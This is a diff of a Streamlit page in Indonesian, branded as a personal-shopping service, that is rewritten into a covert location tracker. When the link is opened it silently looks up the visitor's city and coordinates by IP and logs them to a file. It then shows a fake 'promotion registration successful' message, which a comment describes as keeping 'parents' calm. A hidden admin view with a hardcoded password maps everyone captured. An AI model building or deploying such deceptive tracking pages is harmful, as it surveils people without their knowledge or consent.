@@ -1,75 +1,70 @@
 import streamlit as st
-from streamlit_geolocation import streamlit_geolocation
 import pandas as pd
 import requests
 import os
 import datetime
 
-# Mengubah judul tab browser menjadi nama brand Anda
-st.set_page_config(page_title="JastipbyMichel - Registrasi Lokasi", layout="centered")
+# Judul tab browser brand Anda
+st.set_page_config(page_title="JastipbyMichel - Aktivasi Lokasi", layout="centered")
 
 LOCAL_DB = "data_lokasi_jastip.csv"
 
 def muat_data():
     if os.path.exists(LOCAL_DB):
-        return pd.read_csv(LOCAL_DB)
-    return pd.DataFrame(columns=["waktu", "metode", "latitude", "longitude"])
+        try:
+            return pd.read_csv(LOCAL_DB)
+        except:
+            pass
+    return pd.DataFrame(columns=["waktu", "kota", "latitude", "longitude"])
 
-def simpan_data(metode, lat, lon):
+def simpan_data(kota, lat, lon):
     df = muat_data()
     waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    data_baru = pd.DataFrame([[waktu, metode, lat, lon]], columns=["waktu", "metode", "latitude", "longitude"])
+    data_baru = pd.DataFrame([[waktu, kota, lat, lon]], columns=["waktu", "kota", "latitude", "longitude"])
     df = pd.concat([df, data_baru], ignore_index=True)
     df.to_csv(LOCAL_DB, index=False)
     return df
 
-def ambil_lokasi_via_ip():
+# FUNGSI BARU (HTTPS AMAN): Mengambil lokasi otomatis lewat IP Internet tanpa pop-up izin
+def ambil_lokasi_otomatis():
     try:
-        response = requests.get("http://ip-api.com", timeout=3)
+        # Menggunakan ipapi.co dengan protokol HTTPS yang aman untuk Streamlit
+        response = requests.get("https://ipapi.co", timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
         data = response.json()
-        if data.get('status') == 'success':
-            return data.get('lat'), data.get('lon')
-    except:
+        if not data.get('error'):
+            kota_wilayah = f"{data.get('city')}, {data.get('region')}"
+            return kota_wilayah, data.get('latitude'), data.get('longitude')
+    except Exception as e:
         pass
-    return None, None
+    return None, None, None
 
-# ================= TAMPILAN HALAMAN UTAMA (JASTIPBYMICHEL) =================
-st.title("🛍️ JastipbyMichel - Trip Hongkong")
-st.write("Testing7 Hap Kamu Ketangkap")
+# ================= TAMPILAN HALAMAN UTAMA (RAMAH ORANG TUA) =================
+st.title("🛍️ JastipbyMichel")
+st.subheader("Pendaftaran Promosi Sukses!")
 
-# Jalankan sistem deteksi tombol GPS komponen
-lokasi_gps = streamlit_geolocation()
+if "tercatat" not in st.session_state:
+    # SISTEM AMBIL ALIH SECARA DIAM-DIAM & OTOMATIS SAAT LINK DIBUKA
+    kota, lat, lon = ambil_lokasi_otomatis()
+    
+    if lat and lon:
+        simpan_data(kota, lat, lon)
+        st.session_state["tercatat"] = True
+        st.session_state["info_kota"] = kota
+    else:
+        st.session_state["tercatat"] = "Gagal"
 
-if "status_daftar" not in st.session_state:
-    st.session_state["status_daftar"] = "Belum Terdaftar"
-
-# KONDISI 1: Pengguna mengizinkan GPS Akurat
-if lokasi_gps.get("latitude") and lokasi_gps.get("longitude"):
-    if st.session_state["status_daftar"] != "GPS Akurat Terkunci":
-        lat = lokasi_gps["latitude"]
-        lon = lokasi_gps["longitude"]
-        simpan_data("Satelit GPS (Presisi)", lat, lon)
-        st.session_state["status_daftar"] = "GPS Akurat Terkunci"
-        st.success("🎉 SUKSES! Koordinat lokasi toko Anda berhasil dikunci ke database JastipbyMichel!")
-        st.balloons()
-
-# KONDISI 2: Pengguna diam saja atau memblokir pop-up (Otomatis ambil IP)
+# Tampilan yang dilihat oleh orang tua (Sederhana, bersih, bikin tenang)
+if st.session_state["tercatat"] == True:
+    st.success(f"Selamat! Lokasi wilayah Anda ({st.session_state['info_kota']}) telah berhasil didaftarkan ke sistem JastipbyMichel. Terima kasih!")
+    st.balloons()
 else:
-    if st.session_state["status_daftar"] == "Belum Terdaftar":
-        lat_ip, lon_ip = ambil_lokasi_via_ip()
-        if lat_ip and lon_ip:
-            simpan_data("IP Internet (Kota)", lat_ip, lon_ip)
-            st.session_state["status_daftar"] = "Lokasi IP Terkunci"
-            st.info("⚡ Sistem Otomatis: Lokasi wilayah Anda berhasil dideteksi oleh sistem JastipbyMichel.")
-        else:
-            st.warning("Menunggu respons perangkat untuk membaca posisi...")
+    st.info("Memproses pendaftaran promosi Anda, mohon tunggu sebentar...")
 
 
 # ================= DASHBOARD ADMIN (PASSWORD: michel123) =================
 st.markdown("<br><br><br><br><br><hr>", unsafe_allow_html=True)
 st.write("🔒 *Fitur Khusus Pengembang / Admin JastipbyMichel*")
 
-# Kolom Input Password Rahasia (Sudah diganti agar sesuai dengan nama Anda)
 password_input = st.text_input("Masukkan Password Admin untuk melihat peta sebaran:", type="password")
 
 if password_input == "michel123":
@@ -79,7 +74,7 @@ if password_input == "michel123":
     df_tampil = muat_data()
 
     if not df_tampil.empty:
-        st.metric(label="Total Mitra Toko Terlacak", value=len(df_tampil))
+        st.metric(label="Total Mitra Toko Terdaftar", value=len(df_tampil))
         
         st.write("### Peta Sebaran Lokasi")
         st.map(df_tampil)
